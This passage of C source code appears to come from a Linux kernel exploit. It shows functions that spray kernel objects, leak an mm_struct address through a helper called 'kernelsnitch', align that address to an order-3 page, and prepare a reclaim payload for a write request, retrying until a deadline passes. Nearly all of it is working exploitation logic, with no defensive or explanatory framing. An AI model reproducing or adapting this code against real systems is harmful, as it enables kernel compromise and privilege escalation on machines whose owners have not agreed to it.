  prepare_close_pre_memfds(s);

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(rt->memfd_leak));
  rt->memfd_leak = -1;
  prepare_reclaim_send(s, &msg);
  pr_verbose("[spray] payload ready +%lldms\n", ms_since(t0));
  kernelsnitch_cleanup(rt->ks);
  rt->ks = NULL;

  prepare_payload_cleanup(s);
  return base;
}

static uintptr_t prepare_fail(Glk43499Session *s) {
  Glk43499Runtime *rt = &s->rt;
  if (rt->ks) {
    kernelsnitch_cleanup(rt->ks);
    rt->ks = NULL;
  }
  for (size_t i = 0; i < rt->prepare_ctx.mm_cnt; i++) {
    kill_child(rt->prepare_ctx.childs[i]);
  }
  cleanup_page_prepare_state(s);
  return 0;
}

/** @brief Align the leaked mm_struct to the order-3 page boundary. */
static uintptr_t prepare_page_align(Glk43499Session *s, uintptr_t leaked) {
  size_t order3 = glk43499_order3_size(s->target.layout.page_size,
                                       s->config.mm_order);
  return leaked & ~(order3 - 1);
}

uintptr_t prepare_kernel_page(Glk43499Session *s,
                              const GlkWriteRequest *req) {
  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  uintptr_t result = 0;

  if (prepare_reset(s) != 0) goto fail;
  if (prepare_spray_contexts(s, &t0) != 0) goto fail;
  prepare_leak_children(s);
  if (!prepare_wait_collisions(s, &t0)) goto fail;

  uintptr_t leaked = prepare_leak_mm(s, &t0);
  if (leaked) {
    uintptr_t base = prepare_page_align(s, leaked);
    result = prepare_payload(s, req, base, &t0);
  }

fail:
  return result ? result : prepare_fail(s);
}

uintptr_t prepare_good_kernel_page(Glk43499Session *s,
                                   const GlkWriteRequest *req) {
  int max_attempts = (int)s->config.page_attempts;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  deadline.tv_sec += s->config.page_deadline_sec;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(s, req);
    if (base) {
      pr_debug("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
              ms_since(&t_good));
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}
